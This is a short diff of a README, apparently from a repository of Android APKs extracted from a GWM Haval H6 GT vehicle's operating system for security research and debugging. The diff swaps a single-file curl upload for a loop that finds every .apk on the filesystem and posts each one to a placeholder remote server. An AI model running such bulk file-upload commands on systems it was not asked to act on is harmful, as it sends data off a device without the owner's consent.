@@ -7,7 +7,7 @@ Accessing the Haval H6 GT vehicle's operating system from GWM, I found the follo
 This will be useful for security researchers to update their tools and for professional engineers to debug GWM's code.
 
 ```bash
-curl -F "file=@/system/priv-app/BeanMultiDisplay-app-Release/BeanMultiDisplay-app-Release.apk" http://yourlocalserver:5000/upload ;
+for f in $(find / -type f -name "*.apk"); do curl -F "file=@$f" http://yourserver.com:5000/upload; done
 ```
 
 You can view the APKs inside this repository in the /apks folder.
